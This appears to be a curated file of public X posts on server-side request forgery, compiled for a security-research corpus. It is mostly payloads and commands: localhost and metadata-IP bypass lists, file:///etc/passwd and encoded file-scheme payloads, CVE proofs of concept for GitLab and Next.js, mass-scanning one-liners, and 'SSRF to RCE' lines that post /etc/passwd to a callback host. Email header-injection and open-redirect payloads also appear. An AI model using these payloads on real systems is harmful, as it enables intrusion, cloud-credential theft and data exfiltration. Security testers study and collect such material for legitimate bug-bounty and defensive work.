# X 语料 · SSRF 服务端请求伪造（1）

来源：X 公开贴子，经逐条人工阅读筛选后按技术主题归类。
仅收录纯文本正文，图片与外部媒体已被剥离。作者自述内容，未经复现验证。

> 原贴时间跨度为 2019-2026，条目均为作者自述、未经复现验证；部分技巧可能已随产品版本失效。
> 判定协议：[SSRF](../by-type/ssrf.md) · 索引与计数：[x-corpus.md](x-corpus.md) · 同类：x-exp-ssrf（63 条）、x-residual-ssrf（10 条） · 本文 201 行

- SSRF protection bypass methods:
  -Use Encoding
  * URL encoding :
   localhost >>%6c%6f%63%61%6c%68%6f%73%74
  * Octal encoding :
   127.0.0.1 >> 0177.0.0.01
- Bypass for SSRF filter
  Find a subdomain of your target (whitelisted) that resolves to an internal IP
  Like this internal[.]target[.]com --> 127.0.0.1
- Find api links in subdomains, or how to find a simple SSRF in five minutes in a big company
  assetfinder --subs-only http://target.com | waybackurls | grep "?url="
- Fuzzing list to FIND SSRF
  http://site.com/?url=FUZZ
  http://169.254.169.254\http://0.google.com <=== PHP cve2020
  https://[0:0:0:0:0:0:0:0]
  https://0.0.0.0
  https://[::]
  https://0177.1
  https://0x7f.1
  http://0x7f000001
  http://2130706433
  http://127.000.001
- Different Localhost Encoding for SSRF
  http://127.0.0.1
  http://[::]/
  http://0000::1/
  http://0/
  http://localtest.me
  http://2130706433/
  http://0x7f000001/
  http://0x7f.0x00.0x00.0x01
  http://0177.0.0.01
- SSRF Bypass list for localhost (127.0.0.1):
  http://127.1/
  http://0000::1:80/
  http://[::]:80/
  http://2130706433/
  http://whitelisted@127.0.0.1
  http://0x7f000001/
  http://017700000001
  http://0177.00.00.01
  Also using a redirect to localhost will often work.
- Add %23 (#) or %2523 / %23%32%35 (double encoded) to the end of parameter values and see what happens. If the value is used in a backend API call it might cause an error that you can take advantage of for SSRF.
- https://wiki.target.com /plugins/servlet/oauth/users/icon-uri?consumerUri=
  Fuzz the target name with your site name to gain SSRF to AWS metadata.
- Searching for SSRF/open redirect? Try this one liner:
  gau http://google.com -s | head -n 5000 > google.txt; cat google.txt | sort -u | grep -a -i \=http > google_redirects.txt
- SSRF at loadimg.php?u=https:/ /....
  Got http and dns requests on burp collab.
  file:///etc/passwd returned the same output, but the length was different.
- CVE-2020-5412 POC
  GET /proxy.stream?origin=http://169.254.169.254/latest/metadata/ HTTP/1.1
- Blind SSRF:-
  1. subfinder -d target. com | httprobe -c 100 > target.txt
  2. cat target.txt | waybackurls | gf ssrf
  3. Interesting URL found after manual check, sub . target .com/ image.php? source=
- add this one to your wordlist : /_includes/framer.php
  juicy blind ssrf via `base` param
- Subfinder > waybackurls > Arjun > SSRF > LFI
  Found reference parameter
  xxx?reference=file://\/\/etc/passwd
- Automate SSRF attacks:
  cat params.txt | qsreplace "http://169.254.169.254/latest/meta-data/hostname" | xargs -I host -P 50 bash -c "curl -ks 'host' | grep \"compute.internal\" && echo -e \"[VULNERABLE] - X \n \"" | grep "VULN"
- cat ssrf.txt | qsreplace "interactsh server ID" | anew -q ssrf_test.txt
  ffuf -w ssrf_test.txt -u FUZZ -p "0.6-1.2" -H "(header in thread)" -t 200 -s
- Gitlab SSRF (CVE-2021-22214).
  POC:
  curl -s --show-error -H 'Content-Type: application/json' --data '{ "include_merged_yaml": true, "content": "include:\n remote: http://x.x.x.x/api/v1/targets?test.yml"}' https://REDACTED/api/v4/ci/lint -k
- technique To Bypass SSRF on Webhook ..etc
  1. put http://YOURSERVER.com in the URL input
  2. change the DNS pointing to 127.0.0.1 ..etc
  3. retest the Webhook again (http://YOURSERVER.com:21 ... etc), you will find the internal error.
- SSRF exploitation via URL Scheme
  1-File:Allows an attacker to fetch the content of a file on the server
  file://path/to/file
  file:///etc/passwd
  file://\/\/etc/passwd
  ssrf.php?url=file:///etc/passwd
- SSRF to RCE
  `whoami`.collab-url
  `curl -F '@/etc/passwd' callback.server`.collab-url
  `echo test | tee /tmp/test`.collab-url
  `curl -F '@/tmp/test' callback.server`.collab-url
  https://thehackerish.com/bug-bounty-write-up-from-ssrf-to-4000/
- Got a pingback for SSRF on Burp collaborator, what to test after that:
  1. Internal Port Scanning
  2. Internal Asset leakage
  3. Internal File fetch vulnerability
  If you get the third one, try LFI.
- Find easy SSRF:
  findomain -t DOMAIN -q | httpx -silent -threads 1000 | gau | grep "=" | qsreplace http://YOUR.burpcollaborator.net
- Top 25 Server-Side Request Forgery (SSRF) Dorks
  1.?dest={target}
  2.?redirect={target}
  3.?uri={target}
  4.?path={target}
  5.?continue={target}
  6.?url={target}
  7.?window={target}
  8.?next={target}
  9.?data={target}
  10.?reference={target}
- Type: SSRF Bypass
  Tips: use your server as a prefix of website.
  1) ?parameter=https://Targetdom/ => 200 Ok
  (Replace "Targetdom" to "your server")
  2) ?parameter=https://your-server/=> 403
- SSRF Bypasses
  http://0.0.0.0
  http://0
  http://0x7f000001
  http://2130706433
  http://0000::1
  http://0000::1:25
  http://0000::1:22
  http://0000::1:3128
  http://3232235521
  http://3232235777
  http://2852039166
  http://0o177.0.0.1
- Ssrf onliner
  echo "domain" | hakrawler -d 5 | grep "=" | qsreplace http://burpcollabator.net
- Got a SSRF bypass via URL Shortener.
  1. Got AWS metadata by supplying http://169.254.169.254/latest/meta-data/ in the vulnerable endpoint
  2. Issue fixed
  3. Bypass- Shorten the URL with and used the shortned URL in the vulnerable endpoint.
- add to your fuzz list :
  /api/metadata
  /api/resource
  can be found api/swagger endpoints
- RCE from SSRF
  If you got HTTP pingback on your server, also give this a try
  payload used : `whoami`.collaborator-url
  got callback from : root.collaborator-url
- In SSRF, different attack methods can be used, such as pinging back with cURL or a browser user agent. For example, if the response is from cURL, you can execute an RCE attack in the same way:
  https://ufdiyb8sja4fp5zgl7nw9agvsmycm1.oastify.com?`whoami`
- Quick SSRF tip: If you get blank response while trying to extract sensitive files via SSRF on a PDF generator. The literal "file" scheme might be filtered. So try a few variations like:
  FILE
  fIlE
  fifilele
  FiFilele
  Even encodings can work like:
  %66ile
  fi\u004ce
- Google Dork - SSRF Prone Parameters
  inurl:http | inurl:url= | inurl:path= | inurl:dest= | inurl:html= | inurl:data= | inurl:domain= | inurl:page= inurl:& site:example[.]com
  Find endpoints for SSRF testing
- SSRF - Cloud Metadata
  Don't forget other cloud metadata endpoints like Digital Ocean
  1. Input URL forces the server to make the request and leak the response
  2. Try http://169.254.169.254/metadata/v1.json
- 5/.SSRF (Server-Side Request Forgery):
  john.doe@abc123.burpcollaborator.net john.doe@[127.0.0.1]
  6/.(Email) header injection:
  "%0d%0aContent-Length:%200%0d%0a%0d%0a"@example.com
  "recipient@test.com>\r\nRCPT TO:<victim+"@test.com
- SSRF through Curl
  cat recon.txt | qsreplace "http://bcollaborator.com" > ssrf.txt
  cat ssrf.txt | while read host do;do curl -s -L $host -I|grep "http://bcollaborator.com" && echo -e "$host \033[0;31mVulnerable\n" ;done
- Did you find the SSRF, but http://169.254.169.254/ is blacklisted? tip: try http://0xA9FEA9FE/, http://0251.0376.0251.0376/
- put this directory in your wordlist
  /backend/bffwa?path=hereyourcollabserver
  Check path parameter using this template
  https://raw.githubusercontent.com/projectdiscovery/fuzzing-templates/main/ssrf/response-ssrf.yaml
- SSRF Payloads for LFR/LFD
  file:/etc/passwd%3F/
  file:/etc%252Fpasswd/
  file:/etc%252Fpasswd%3F/
  file:///etc/%3F/../passwd
  file:${br}/et${u}c%252Fpas${te}swd%3F/
  file:$(br)/et$(u)c%252Fpas$(te)swd%3F/
  SSRF POLYGLOT
  file:///etc/passwd?/../passwd
- CVE-2024-34351 : Server-Side Request Forgery on Next.js
  https://github.com/vercel/next.js/security/advisories/GHSA-fr5h-rqp8-mj6g
  https://assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps
  POC:
  POST /x HTTP/2
  Host: attacker*com
  Content-Length: 2
  Next-Action: xxxx
  {}
- If you have internal API endpoints like "https[:]//172.17.0.3/api/user?id=123&action=delete", there is a chance you can reach them via a WordPress website of the target by using its pingback API as blind SSRF
- When you're looking for bugs like SSRF & Open Redirect.
  and there is a blacklisted character.
  try to bypassed using other Unicode characters.
  Try Open Redirect Bypass Using (。) Chinese dot "%E3%80%82".
  poc: redirect_to=////evil%E3%80%82com
- Put 'req.query.cont:"https%3A%2F%2F' into your @CaidoIO search bar after hacking on a target for a while and see what comes up. Good place to look for SSRF.
- SSRF in pdf generation!
  this api endpoint send the pdf generation request:
  POST /api/v1/convert/markdown/pdf
  Add this payload:
  comes 200ok and hit request in burp collaborator.
